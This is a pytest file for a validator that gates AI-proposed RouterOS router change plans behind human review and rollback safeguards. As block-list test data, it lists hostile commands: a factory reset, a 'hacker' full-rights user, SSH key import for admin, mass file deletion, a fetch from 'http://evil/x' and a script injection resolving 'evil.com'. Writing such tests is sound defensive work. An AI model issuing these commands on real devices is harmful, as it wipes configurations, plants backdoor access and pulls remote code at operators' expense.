"""Validator for proposed change plans.

The model writes plans; this module decides whether one may be queued. These tests are the
contract: a model must not be able to talk its way past them.
"""
from __future__ import annotations

import pytest

from app import changes


def v(text):
    return changes.validate(text)


# --------------------------------------------------------------- accepted

def test_a_plain_firewall_rule_is_accepted():
    r = v("/ip firewall filter add action=accept chain=forward comment=\"allow guests\" src-address=10.0.9.0/24")
    assert r.ok and not r.blocked and r.risk == "normal"


def test_multiple_commands_are_accepted():
    r = v("/ip firewall address-list add address=1.2.3.4 list=blocked\n"
          "/ip dns set servers=1.1.1.1,9.9.9.9")
    assert r.ok and len(r.commands) == 2


def test_comments_and_blank_lines_are_ignored():
    r = v("# add a rule\n\n/ip dns set servers=1.1.1.1\n")
    assert r.ok and r.commands == ["/ip dns set servers=1.1.1.1"]


# --------------------------------------------------------------- blocked outright

@pytest.mark.parametrize("cmd", [
    "/system reset-configuration no-defaults=yes",
    "/system reboot",
    "/system shutdown",
    "/system package update install",
    "/system backup load name=x",
    "/system script add name=x source=\":log info x\"",
    "/system scheduler add name=x on-event=\"/system reboot\"",
    "/user add name=hacker group=full",
    "/user remove admin",
    "/user ssh-keys import user=admin public-key-file=k.pub",
    "/file remove [find]",
    "/certificate remove [find]",
    "/tool fetch url=http://evil/x",
    "/import file=x.rsc",
    "/interface wireguard set wg0 private-key=\"AAAA\"",
])
def test_destructive_commands_are_rejected(cmd):
    r = v(cmd)
    assert not r.ok, f"should have been blocked: {cmd}"
    assert r.risk == "blocked"


def test_command_chaining_is_rejected():
    r = v("/ip dns set servers=1.1.1.1; /system reboot")
    assert not r.ok and "несколько команд" in r.blocked[0].reason


def test_script_expressions_are_rejected():
    assert not v('/ip dns set servers=[:resolve evil.com]').ok
    assert not v(':execute "/system reboot"').ok


def test_menus_outside_the_allowlist_are_rejected():
    r = v("/partitions set 0 name=x")
    assert not r.ok and "вне разрешённого списка" in r.blocked[0].reason


def test_an_unparseable_command_is_rejected_rather_than_guessed_at():
    r = v("/partitions repartition")
    assert not r.ok and "не удалось разобрать" in r.blocked[0].reason


def test_reads_do_not_belong_in_a_change_plan():
    assert not v("/ip firewall filter print").ok


def test_empty_and_oversized_plans_are_rejected():
    assert not v("").ok
    assert not v("\n".join(["/ip dns set servers=1.1.1.1"] * 41)).ok


def test_a_single_bad_command_blocks_the_whole_plan():
    r = v("/ip firewall filter add action=accept chain=forward\n/system reboot")
    assert not r.ok
    assert r.blocked[0].line == 2


# --------------------------------------------------------------- flagged but allowed

@pytest.mark.parametrize("cmd,fragment", [
    ("/ip address remove [find address=10.0.0.1/24]", "потерять управление"),
    ("/ip firewall filter add action=drop chain=input", "drop без ограничения"),
    ("/interface ethernet disable ether2", "интерфейс"),
    ("/ip route remove [find dst-address=0.0.0.0/0]", "маршрут"),
    ("/ip service set ssh disabled=yes", "сервис"),
])
def test_lockout_risks_are_flagged_not_blocked(cmd, fragment):
    r = v(cmd)
    assert r.ok, "should be allowed but flagged"
    assert r.risk == "high"
    assert any(fragment in f.reason for f in r.risky)


def test_an_input_chain_rule_is_flagged_even_when_the_source_is_pinned():
    """Touching chain=input is what can lock the operator out, source or not."""
    r = v("/ip firewall filter add action=accept chain=input src-address=10.0.0.0/8")
    assert r.ok and r.risk == "high"
    assert any("input" in f.reason for f in r.risky)


def test_drop_with_a_source_is_not_flagged_as_an_open_drop():
    r = v("/ip firewall filter add action=drop chain=forward src-address=10.0.9.0/24")
    assert r.ok
    assert not any("drop без ограничения" in f.reason for f in r.risky)


def test_summary_reports_the_reason():
    assert "запрещено" in v("/system reboot").summary()
    assert "явных рисков" in v("/ip dns set servers=1.1.1.1").summary()


# --------------------------------------------------------------- queue behaviour

def test_propose_change_queues_a_valid_plan(tmp_path):
    import asyncio

    from app import db, tools

    db.create_device({"slug": "planbox", "name": "PlanBox", "host": "192.0.2.70", "port": 22,
                      "username": "agent", "auth": "key"})
    out = asyncio.run(tools.call("propose_change", {
        "device": "planbox", "title": "Открыть DNS",
        "rationale": "Клиенты не резолвят имена, нужен публичный резолвер.",
        "commands": "/ip dns set servers=1.1.1.1,9.9.9.9",
    }))
    assert "поставлен в очередь" in out and "Ничего ещё не применено" in out
    plans = [p for p in db.list_plans() if p["device_slug"] == "planbox"]
    assert len(plans) == 1
    plan = plans[0]
    assert plan["status"] == "pending" and plan["risk"] == "normal"
    assert plan["created_by"] == "agent"
    db.delete_device(db.get_device_by_slug("planbox")["id"])


def test_propose_change_refuses_a_destructive_plan_without_queueing_it():
    import asyncio

    from app import db, tools

    db.create_device({"slug": "nukebox", "name": "NukeBox", "host": "192.0.2.71", "port": 22,
                      "username": "agent", "auth": "key"})
    before = len(db.list_plans())
    out = asyncio.run(tools.call("propose_change", {
        "device": "nukebox", "title": "почистить", "rationale": "надо",
        "commands": "/system reset-configuration no-defaults=yes",
    }))
    assert "ОТКЛОНЕНО" in out
    assert len(db.list_plans()) == before, "отклонённый план не должен попадать в очередь"
    db.delete_device(db.get_device_by_slug("nukebox")["id"])


def test_propose_change_requires_a_rationale():
    import asyncio

    from app import tools

    out = asyncio.run(tools.call("propose_change", {
        "device": "x", "title": "t", "commands": "/ip dns set servers=1.1.1.1", "rationale": "  ",
    }))
    assert out.startswith("ERROR:") and "rationale" in out


def test_rollback_machinery_is_unreachable_from_a_plan():
    """A plan must not be able to disarm its own safety net."""
    from app import apply

    for cmd in (f'/system scheduler set [find name="{apply.SCHEDULER_NAME}"] disabled=yes',
                f"/system backup load name={apply.BACKUP_NAME}",
                f"/system backup save name={apply.BACKUP_NAME}",
                "/file remove [find name=agent-rollback.backup]"):
        assert not changes.validate(cmd).ok, f"должно блокироваться: {cmd}"


def test_write_group_has_no_policy_right():
    """'policy' would let the write account manage users; the scheduler is pre-installed instead."""
    from app import onboard

    granted = set(onboard.WRITE_GROUP_POLICY.split(","))
    assert granted == {"ssh", "read", "write"}
    assert "policy" not in granted and "sensitive" not in granted and "ftp" not in granted
    assert onboard.WRITE_GROUP != onboard.GROUP


def test_apply_clamps_the_rollback_window():
    from app import apply

    assert apply.MIN_ROLLBACK_MINUTES >= 2
    assert apply.MAX_ROLLBACK_MINUTES <= 60
    assert apply.MIN_ROLLBACK_MINUTES <= apply.DEFAULT_ROLLBACK_MINUTES <= apply.MAX_ROLLBACK_MINUTES


# --------------------------------------------------------------- failure honesty

def test_failed_plan_without_a_backup_offers_no_rollback(tmp_path):
    """A failure before the backup step must not claim a backup exists."""
    import re
    from pathlib import Path

    src = (Path(__file__).resolve().parents[1] / "app" / "apply.py").read_text()
    # backup_name is only persisted when the backup actually succeeded.
    assert '"backup_name": backup if backup_ok else ""' in src
    assert "backup_ok = True" in src
    # and it is set only after the save was checked
    save_idx = src.index("/system backup save")
    check_idx = src.index('_check(out, "создание бэкапа")')
    ok_idx = src.index("backup_ok = True")
    assert save_idx < check_idx < ok_idx


def test_preflight_checks_happen_before_anything_is_touched():
    """Scheduler presence is verified before the backup and before arming."""
    from pathlib import Path

    src = (Path(__file__).resolve().parents[1] / "app" / "apply.py").read_text()
    body = src[src.index("async def apply_plan"):]
    sched_check = body.index("scheduler print count-only")
    backup = body.index("/system backup save")
    arm = body.index("disabled=no")
    first_cmd = body.index("for cmd in commands:")
    assert sched_check < backup < arm < first_cmd


def test_rollback_is_armed_before_the_first_command():
    """The whole point: a command that cuts us off must already be recoverable."""
    from pathlib import Path

    src = (Path(__file__).resolve().parents[1] / "app" / "apply.py").read_text()
    body = src[src.index("async def apply_plan"):]
    assert body.index("armed_ok = True") < body.index("for cmd in commands:")


# --------------------------------------------------------------- RouterOS policy semantics

def test_exact_policy_denies_everything_not_granted():
    """`/user group set policy=` with only positives does NOT drop previously granted rights on
    RouterOS 7.22 - verified on hardware. Every policy must be stated explicitly."""
    from app import onboard

    out = onboard.exact_policy("ssh,read")
    granted = [p for p in out.split(",") if not p.startswith("!")]
    denied = [p[1:] for p in out.split(",") if p.startswith("!")]
    assert granted == ["ssh", "read"]
    assert set(granted) | set(denied) == set(onboard.ALL_POLICIES)
    for dangerous in ("write", "policy", "sensitive", "ftp", "test", "reboot"):
        assert dangerous in denied


def test_exact_policy_rejects_a_typo():
    from app import onboard

    with pytest.raises(ValueError):
        onboard.exact_policy("ssh,raed")


def test_every_group_command_pins_the_full_policy_set():
    """A bare positive list would silently leave a pre-existing group wider than intended."""
    import re
    from pathlib import Path

    src = (Path(__file__).resolve().parents[1] / "app" / "onboard.py").read_text()
    commands = [l for l in src.splitlines()
                if ("/user group add" in l or "/user group set" in l) and "policy={" in l]
    assert commands, "no group commands found - did onboard.py change shape?"
    for line in commands:
        assert "exact_policy(" in line, f"policy not pinned: {line.strip()}"


def test_group_policy_is_verified_after_being_set():
    from pathlib import Path

    src = (Path(__file__).resolve().parents[1] / "app" / "onboard.py").read_text()
    assert src.count("await _assert_group_policy(") == 2
    assert "actual != want" in src
